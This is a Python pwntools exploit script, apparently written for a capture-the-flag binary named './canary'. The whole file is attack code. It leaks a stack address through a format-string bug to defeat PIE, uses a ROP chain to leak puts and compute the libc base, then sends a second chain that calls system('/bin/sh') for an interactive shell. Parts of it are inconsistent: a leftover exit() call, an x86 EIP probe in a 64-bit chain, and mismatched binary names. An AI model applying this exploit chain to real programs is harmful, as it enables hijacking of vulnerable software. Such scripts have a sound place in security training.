from pwn import *

def find_eip(payload):
    p = process(exe)
    p.recvuntil(b"protector!\n")
    p.sendline(b"test")
    p.recvuntil(b"attack :P\n")
    p.sendline(payload)
    p.wait()                    # wait process to crash
    eip_offset = cyclic_find(p.corefile.eip) # x86
    info('located EIP offset at {a}'.format(a=eip_offset))

exe = './canary'
elf = context.binary = ELF(exe, checksec=False) # wont exec checksec
context.log_level = 'debug'     # a lot of debug info

offset = find_eip(cyclic(600))
exit()
offset = 264

p = process(exe)                        # start program
p.recvuntil(b':')                       # rec till enter your name:
p.sendline(b'%15$p')                    # leak 15th addr from stack (leak RET addr)
p.recvuntil(b'Hello ')                  # leak address just after
leaked_addr = int(p.recvline(), 16)
info("leaked_address: %#x", leaked_addr)

elf.address = leaked_addr - 0x1224      # ret leaked addr is at 0x1224 offset
info("piebase: %#x", elf.address)

pop_rdi_offset = 0x12ab                 # POP RDI;          $ ropper --file leak_pie --search "pop rdi"
pop_rdi = elf.address + pop_rdi_offset  # base + pop_rdi offset = real addr of pop_rdi in memory
info("pop rdi offset: %#x", pop_rdi_offset)
info("pop rdi addr: %#x", pop_rdi)

payload = flat({
    offset: [
        pop_rdi,            # Pop got.puts into RDI
        elf.got.puts,       # libc addr of puts as argument
        elf.plt.puts,       # Call puts() with the libc addr of puts as argument
        elf.symbols.vuln,   # Return to vuln to re-overflow with another payload
    ]
})

p.recvuntil(b":P\n")
p.sendline(payload)
p.recvlines(1)

got_puts = unpack(p.recv()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)

libc_base = got_puts - 0x74aa0          # readelf -s /usr/lib/libc.so.6 | grep puts
info("libc_base: %#x", libc_base)       # Substract puts offset to get libc base

system_addr = libc_base + 0x493d0       # readelf -s /usr/lib/libc.so.6 | grep system
info("system_addr: %#x", system_addr)   # With base known, add offset of system

bin_sh = libc_base + 0x198031           # strings -a -t x /usr/lib/libc.so.6 | grep /bin/sh
info("/bin/sh addr: %#x", bin_sh)

ret_offset = 0x1016                     # $ ropper --file leak_pie --search "ret"
ret = elf.address + ret_offset          # calculate ret addr with base addr

payload = flat({
    offset: [
        pop_rdi,
        bin_sh,
        ret,
        system_addr
    ]
})

write('payload', payload)

p.sendline(payload)
p.interactive()

